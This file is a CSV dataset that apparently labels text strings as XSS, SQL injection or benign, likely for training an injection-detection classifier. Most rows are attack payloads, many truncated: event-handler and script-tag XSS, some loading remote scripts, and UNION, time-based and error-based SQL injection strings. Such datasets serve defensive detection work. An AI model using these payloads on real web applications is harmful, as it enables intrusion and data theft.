Payload,Label,text_label,ID
<main onpointermove=alert(1)>XSS</main>,1,XSS,4060
"1%"" and 6414 = ( select count ( * ) from rdb$field",2,SQLi,20707
"Our select dance troupe, Random Dancers, had assor",0,normal,25797
javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#,1,XSS,9403
-3596 ) ) ) or 5903 = ( 'qqpjq'|| ( select case 59,2,SQLi,22128
Select a comfortable chair for the meeting.,0,normal,22916
"( select concat ( 0x7171706a71, ( select ( elt ( 7",2,SQLi,21826
"{""id"":null,""name"":""Mantine""}",0,normal,26974
select * from users where id = '1' union select ||,2,SQLi,11403
âI do think that being able to select different pe,0,normal,26443
"-5826"" ) ) union all select 7192,7192#",2,SQLi,17923
<style>:target {transform: rotate(180deg);}</style,1,XSS,7459
1%' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 10,2,SQLi,18702
"In many agencies, the birth mothers select the pro",0,normal,26006
<li onpointerup=alert(1)>XSS</li>,1,XSS,6439
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,12166
<style>:target {color:red;}</style><keygen id=x st,1,XSS,2626
1'|| ( select 'wtdz' from dual where 1866 = 1866 o,2,SQLi,22326
"1"" union all select null,null,null,null#",2,SQLi,14803
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10437
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,19252
<script src=http://yoursite.com/your_files.js></sc,1,XSS,1289
"{""id"":null,""firstName"":""Brandon"",""lastName"":""Lee"",",0,normal,27481
"1"" ) ) ) and 6510 = ( select count ( * ) from sysu",2,SQLi,18849
1,0,normal,26684
"<progress oncut=""alert(1)"" contenteditable>test</p",1,XSS,8177
"select * from users where id = 1 or ""?#"" or 1 = 1 ",2,SQLi,11399
<style>:target {color: red;}</style><address id=x ,1,XSS,3981
1'|| ( select 'xugb' from dual where 6772 = 6772,2,SQLi,17934
1' ) or 2633 = dbms_pipe.receive_message ( chr ( 1,2,SQLi,13673
"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( *",2,SQLi,17113
"<div style=""font-family:foo{bar;background:url(htt",1,XSS,708
"<iframe onmouseenter=""alert(1)"">test</iframe>",1,XSS,1873
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomb",2,SQLi,17026
"1%' union all select null,null,null,null,null,null",2,SQLi,19237
"<footer onbeforepaste=""alert(1)"" contenteditable>t",1,XSS,2524
<animatetransform onpointerup=alert(1)>XSS</animat,1,XSS,8319
<marguee/onstart=alert(1)>,1,XSS,9229
"{""id"":null,""firstName"":""Lee Huey"",""lastName"":""Sia""",0,normal,27439
"1' ) where 7887 = 7887 and updatexml ( 3393,concat",2,SQLi,16584
"( convert ( int, ( select char ( 113 ) +char ( 113",2,SQLi,13247
1'+ ( select hspl where 4530 = 4530 and 9660 = ( s,2,SQLi,15489
-- &password =,2,SQLi,11664
"<article draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,7595
"<STYLE type=""text/css"">BODY{background:url(""javasc",1,XSS,767
"1"" where 3990 = 3990 and 8594 = ( select 8594 from",2,SQLi,16353
"<frameset oncut=""alert(1)"" contenteditable>test</f",1,XSS,7074
"Log into your account, select your user name, then",0,normal,25904
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%",1,XSS,340
"select * from users where id = 1 or 1#""@ union sel",2,SQLi,11979
-3597' ) ) order by 1--,2,SQLi,22319
1 rlike ( select * from ( select ( sleep ( 5 ) ) ),2,SQLi,17756
"1 ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555",2,SQLi,16371
1'+ ( select 'arzm' where 6464 = 6464 or 8466 = be,2,SQLi,12814
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10457
select * from users where id = 1 or \+<\ or 1 = 1 ,2,SQLi,11988
or 1 --',2,SQLi,10136
"-7412"" ) as qngt where 2041 = 2041 union all selec",2,SQLi,17868
"<acronym draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,4956
"<iframe onkeypress=""alert(1)"" contenteditable>test",1,XSS,5506
Select a quote to inspire others.,0,normal,24094
1' where 5251 = 5251 or ( select 9173 from ( selec,2,SQLi,15627
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3134
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&q,1,XSS,1396
javascript\x0A:javascript:confirm(1),1,XSS,9481
"<video oncanplay=alert(1)><source src=""validvideo.",1,XSS,2939
"-1512 union all select 9013,9013,9013,9013#",2,SQLi,14663
"{""id"":null,""firstName"":""Robib"",""lastName"":""Thyng"",",0,normal,26893
"1' union all select null,null,null,null--",2,SQLi,12231
"1"" ) ) or 8156 = ( select count ( * ) from generat",2,SQLi,19028
"admin"" or 1 = 1/*",2,SQLi,11853
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,19925
1 ) ) as xebl where 3105 = 3105 or 8421 = ( select,2,SQLi,14994
<option id=x tabindex=1 onfocusin=alert(1)></optio,1,XSS,7441
1%' and 3754 = ( select upper ( xmltype ( chr ( 60,2,SQLi,20731
Where's the fortress?,0,normal,23574
1,0,normal,26705
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10580
"In Settings, scroll to find and select Display & B",0,normal,26001
"<img\x10src=x onerror=""javascript:alert(1)"">",1,XSS,657
"1%' union all select null,null,null,null--",2,SQLi,15461
"?page=javascript:alert(1)""",1,XSS,9878
select,0,normal,26601
1 ) where 6090 = 6090,2,SQLi,17504
month,0,normal,23201
"-1748%"" ) ) ) union all select 2987#",2,SQLi,21641
<figcaption id=x tabindex=1 onbeforeactivate=alert,1,XSS,4642
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,22391
Select a fragrance for the room.,0,normal,24212
"1%"" ) procedure analyse ( extractvalue ( 9627,conc",2,SQLi,18126
or sleep(__TIME__)=',2,SQLi,10135
"<;A HREF="";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.1",1,XSS,1672
"<bdo onmouseover=""alert(1)"">test</bdo>",1,XSS,6470
Select chart.,0,normal,24655
"{""id"":null,""name"":""best""}",0,normal,27281
"<template onmouseleave=""alert(1)"">test</template>",1,XSS,3932
1%' ) ) and 8407 = ( select count ( * ) from gener,2,SQLi,14988
"{""id"":null,""name"":""strip""}",0,normal,27382
"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ",2,SQLi,20498
<<SCRIPT>alert(ï¿½XSSï¿½);//<</SCRIPT>,1,XSS,1724
"1%"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""%"" = ",2,SQLi,20576
"<style>@keyframes slidein {}</style><base style=""a",1,XSS,4906
1' ) union all select null--,2,SQLi,14441
"1"" where 2886 = 2886",2,SQLi,16319
"{""id"":null,""firstName"":""Grasyah"",""lastName"":""Santh",0,normal,26986
<svg><button onload=alert(1)></button>,1,XSS,3850
-5021'+ ( select yadq where 4285 = 4285 order by 1,2,SQLi,12122
Congratulations to our very own @JulienMid and @Va,0,normal,26507
select ( case when ( 1434 = 1549 ) then 1434 else ,2,SQLi,15029
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10465
Save up to 30% off select Easter Favorites from Cr,0,normal,25722
"1"" ) union all select null,null,null,null,null,nul",2,SQLi,18599
<datalist id=x tabindex=1 onfocus=alert(1)></datal,1,XSS,5003
"1%"" ) union all select null,null,null,null#",2,SQLi,13366
1 ) where 9213 = 9213 and 8189 = ( select count ( ,2,SQLi,21987
""")))))) waitfor delay '0:0:20' /*",2,SQLi,10947
"{""id"":null,""firstName"":""Jacqueline"",""lastName"":""Ta",0,normal,27183
Determine fields where required.,0,normal,23347
<big id=x tabindex=1 onactivate=alert(1)></big>,1,XSS,4249
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,21051
"<noembed oncut=""alert(1)"" contenteditable>test</no",1,XSS,6055
1' ) ) or 2633 = dbms_pipe.receive_message ( chr (,2,SQLi,22154
-3441' ) ) as dxvt where 9291 = 9291 union all sel,2,SQLi,15905
1 ) where 2468 = 2468 and ( select * from ( select,2,SQLi,17567
</scrip</script>t><img src =q onerror=prompt(8)>,1,XSS,352
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2422
"<style>@keyframes slidein {}</style><dl style=""ani",1,XSS,4326
"<article onmouseup=""alert(1)"">test</article>",1,XSS,3740
<ins id=x tabindex=1 onactivate=alert(1)></ins>,1,XSS,3104
1%' ) or 5356 = ( select count ( * ) from sysusers,2,SQLi,21042
"1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '",2,SQLi,14064
1' ) ) ( select ( case when ( 5451 = 5451 ) then r,2,SQLi,20412
-2749' ) as fiho where 3531 = 3531 or 2777 = 1485#,2,SQLi,16065
"1"" ) as jrse where 9185 = 9185 and 7756 = dbms_uti",2,SQLi,17468
-5170' ) ) as ovbf where 4833 = 4833 union all sel,2,SQLi,15428
"-5032' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr (",2,SQLi,13297
<SCRIPT+FOR=document+EVENT=onreadystatechange>Mous,1,XSS,9055
"{""id"":null,""firstName"":""Renee"",""lastName"":""Tan"",""a",0,normal,27076
1 and ascii ( lower ( substring ( ( select top 1 n,2,SQLi,11392
ORDER BY 5--,2,SQLi,10247
<noscript onpointerup=alert(1)>XSS</noscript>,1,XSS,4387
"<element onmouseup=""alert(1)"">test</element>",1,XSS,5827
"{""id"":null,""name"":""reason""}",0,normal,27020
<b id=x tabindex=1 onfocus=alert(1)></b>,1,XSS,6418
"<img onmouseleave=""alert(1)"">test</img>",1,XSS,6018
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10672
"<summary onmouseover=""alert(1)"">test</summary>",1,XSS,8160
#ERROR!,2,SQLi,10974
-5555 ) ) as ldte where 4583 = 4583 order by 1#,2,SQLi,14222
"<style>@keyframes x{}</style><link style=""animatio",1,XSS,6723
Select a book for your reading list.,0,normal,24026
"<nav ondblclick=""alert(1)"">test</nav>",1,XSS,8605
"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +cha",2,SQLi,13877
<menuitem onpointermove=alert(1)>XSS</menuitem>,1,XSS,3950
Select a fitness class to attend.,0,normal,24024
Specify filters where required.,0,normal,23297
1%' and sleep ( 5 ) #,2,SQLi,15759
<video onpointerleave=alert(1)>XSS</video>,1,XSS,8771
Merge the musical notes.,0,normal,22568
-1168 ) ) as vlol where 3475 = 3475 or 1 group by ,2,SQLi,14408
1'|| ( select 'sbft' where 8748 = 8748,2,SQLi,15245
"-1985%' ) ) ) union all select 3051,3051,3051--",2,SQLi,20549
"<br onbeforecopy=""alert(1)"" contenteditable>test</",1,XSS,8831
expression(alert('')),1,XSS,8481
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,1,XSS,1656
"<time onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,2187
<code onpointerup=alert(1)>XSS</code>,1,XSS,4791
"<div style=""font-family:'foo&#10;;color:red;';"">LO",1,XSS,968
"Price starts at $318.66, depending on what Mario g",0,normal,25762
"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 )",2,SQLi,12866
<style>:target {color: red;}</style><optgroup id=x,1,XSS,3540
1'|| ( select 'zyvk' from dual where 2072 = 2072,2,SQLi,12264
"1' and elt ( 1533 = 5695,5695 ) and 'ycgi' = 'ycgi",2,SQLi,19743
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71,",2,SQLi,13616
"<track onmouseup=""alert(1)"">test</track>",1,XSS,2606
"<style>@keyframes x{}</style><bdo style=""animation",1,XSS,5307
Let's explore where the river flows into.,0,normal,23821
"<svg onUnload svg onUnload=""javascript:javascript:",1,XSS,402
"-6294"" union all select 9921,9921,9921,9921,9921,9",2,SQLi,17246
1' ) ) ) ( select ( case when ( 4587 = 4587 ) then,2,SQLi,21068
Join club.,0,normal,23098
<script>parent['alert'](1)</script>,1,XSS,9715
":ex/**//*/*/pression(alert(""""))'>",1,XSS,7505
Select your achievement.,0,normal,24931
>><marquee><h1>XSS</h1></marquee>,1,XSS,1305
"1"" ) ) as yosd where 1255 = 1255",2,SQLi,22114
"{""id"":null,""firstName"":""Krisalya"",""lastName"":""Zaki",0,normal,27323
1'|| ( select 'feyg' from dual where 7734 = 7734 a,2,SQLi,16624
"<span onclick=""alert(1)"">test</span>",1,XSS,3535
1' ( select ( case when ( 5451 = 5451 ) then regex,2,SQLi,20625
Select your negotiate.,0,normal,25052
1 ) as azdb where 4219 = 4219 union all select nul,2,SQLi,18836
The following options can be used to select whethe,0,normal,25440
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5324
1 ) ) ) and ( select * from ( select ( sleep ( 5 ),2,SQLi,14114
"1' ) where 8125 = 8125 and 4241 = convert ( int, (",2,SQLi,15978
